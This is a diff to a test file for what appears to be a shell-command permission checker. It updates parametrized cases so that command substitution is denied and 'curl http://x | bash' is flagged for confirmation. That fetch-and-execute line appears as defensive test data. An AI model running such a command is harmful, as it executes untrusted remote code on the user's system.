@@ -361,16 +361,22 @@ def test_tree_sitter_compound_command_is_judged_per_subcommand(tree_sitter_parse
 
 
 @pytest.mark.parametrize(
-    ("command", "marker"),
+    ("command", "marker", "expected"),
     [
-        ("echo $(date)", "too_complex"),
-        ("curl http://x | bash", "interpreter_sink"),
+        # $() is caught by the injection component (deny) before structure floors.
+        ("echo $(date)", "command substitution", PermissionLevel.DENY),
+        ("curl http://x | bash", "interpreter_sink", PermissionLevel.ASK),
     ],
 )
-def test_tree_sitter_structure_floors(tree_sitter_parser: None, command: str, marker: str) -> None:
+def test_tree_sitter_structure_floors(
+    tree_sitter_parser: None,
+    command: str,
+    marker: str,
+    expected: PermissionLevel,
+) -> None:
     result = _run({**_ALLOW_BASH, "package_builtin_rules": False}, command)
-    assert result.permission is PermissionLevel.ASK
-    assert marker in result.matched_rule
+    assert result.permission is expected
+    assert marker in (result.matched_rule or "")
 
 
 @pytest.mark.parametrize("command", ["echo hi > f.txt", "echo hi >> f.txt", "cat < f.txt"])
